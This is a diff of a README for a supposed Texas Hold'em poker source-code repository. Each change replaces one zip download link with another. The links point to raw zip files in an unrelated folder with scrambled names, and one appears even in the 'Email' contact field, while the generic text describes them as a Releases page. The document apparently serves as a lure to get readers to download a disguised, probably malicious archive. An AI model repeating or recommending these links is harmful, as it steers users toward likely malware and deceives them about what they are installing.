@@ -1,7 +1,7 @@
 # 🎉 Texas-Hold-em-Source-Code_Texas-Hold-em-Game - Enjoy Poker Without Coding
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Game_Texas_Hold_Source_em_Code_2.4.zip%20Now-%20blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Game_Texas_Hold_Source_em_Code_2.4.zip)
+[![Download from Releases](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Texas-em-Game-Hold-Code-Source-1.5.zip%20Now-%20blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Texas-em-Game-Hold-Code-Source-1.5.zip)
 
 ## 🏁 Introduction
 Welcome to the Texas Hold'em game source code repository. This easy-to-use poker software supports multiple languages and can run on iOS devices. Enjoy a robust experience with various features, including cash tables and club management. Whether you're creating a poker club or just want to play with friends, this source code makes it easy.
@@ -11,7 +11,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to open the Releases page where you can download the software.
 
-   [Download Releases Here](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Game_Texas_Hold_Source_em_Code_2.4.zip)
+   [Download Releases Here](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Texas-em-Game-Hold-Code-Source-1.5.zip)
 
 2. **Select the Version You Want**: Look for the latest version listed on the Releases page. It usually has the highest number, indicating it's the most recent.
 
@@ -48,7 +48,7 @@ Once installed, you can create or join a game. Here’s how:
 If you encounter any issues or have questions, feel free to reach out:
 
 - **Telegram**: @xuzongbin001
-- **Email**: https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Game_Texas_Hold_Source_em_Code_2.4.zip
+- **Email**: https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Texas-em-Game-Hold-Code-Source-1.5.zip
 
 For more detailed troubleshooting steps, refer to the FAQ section in the application or visit our support forum.
 
@@ -58,6 +58,6 @@ We welcome contributions from users. If you have suggestions or improvements, pl
 ## 🚀 Download & Install
 To begin, visit the Releases page to download the latest version of the application.
 
-[Download Releases Here](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Game_Texas_Hold_Source_em_Code_2.4.zip)
+[Download Releases Here](https://raw.githubusercontent.com/jahmireS/Texas-Hold-em-Source-Code_Texas-Hold-em-Game/main/superstrata/Texas-em-Game-Hold-Code-Source-1.5.zip)
 
 Follow the earlier steps to install the application and start your poker journey today. Enjoy the game, and may the odds be in your favor!
